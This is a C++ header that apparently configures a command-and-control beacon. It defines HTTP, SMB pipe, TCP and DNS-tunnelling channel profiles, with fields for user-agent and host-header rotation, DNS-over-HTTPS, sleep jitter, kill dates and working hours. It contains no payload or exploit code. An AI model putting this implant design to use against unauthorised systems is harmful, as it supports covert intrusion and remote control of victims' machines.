#pragma once

#include <windows.h>

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT

// Proxy type definitions
#define PROXY_TYPE_NONE     0
#define PROXY_TYPE_HTTP     1
#define PROXY_TYPE_HTTPS    2

typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	ULONG  uri_count;
	BYTE** uris;
	BYTE*  parameter;
	ULONG  ua_count;
	BYTE** user_agents;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
	ULONG  hh_count;
	BYTE** host_headers;
	BYTE   rotation_mode;   // 0=sequential, 1=random
	BYTE   proxy_type;      // 0=none, 1=http, 2=https
	BYTE*  proxy_host;
	WORD   proxy_port;
	BYTE*  proxy_username;
	BYTE*  proxy_password;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;

#define DNS_MODE_UDP           0
#define DNS_MODE_DOH           1
#define DNS_MODE_UDP_FALLBACK  2
#define DNS_MODE_DOH_FALLBACK  3

typedef struct {
	BYTE* domain;
	BYTE* resolvers;
	BYTE* doh_resolvers;
	BYTE* qtype;       
	ULONG pkt_size;     
	ULONG label_size;   
	ULONG ttl;          
	BYTE* encrypt_key;  
	ULONG burst_enabled;
	ULONG burst_sleep;
	ULONG burst_jitter;
	ULONG dns_mode;
	BYTE* user_agent;
} ProfileDNS;

#endif



class AgentConfig
{
public:
	BOOL active;

	ULONG agent_type;
	ULONG listener_type;
	BYTE* encrypt_key;
	ULONG sleep_delay;
	ULONG jitter_delay;
	ULONG kill_date;
	ULONG working_time;

	BYTE  exit_method;
	ULONG exit_task_id;
	ULONG download_chunk_size;

#if defined(BEACON_HTTP)
	ProfileHTTP profile;

#elif defined(BEACON_SMB)
	ProfileSMB profile;

#elif defined(BEACON_TCP)
	ProfileTCP profile;

#elif defined(BEACON_DNS)
	ProfileDNS profile;

#endif

	AgentConfig();

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;
};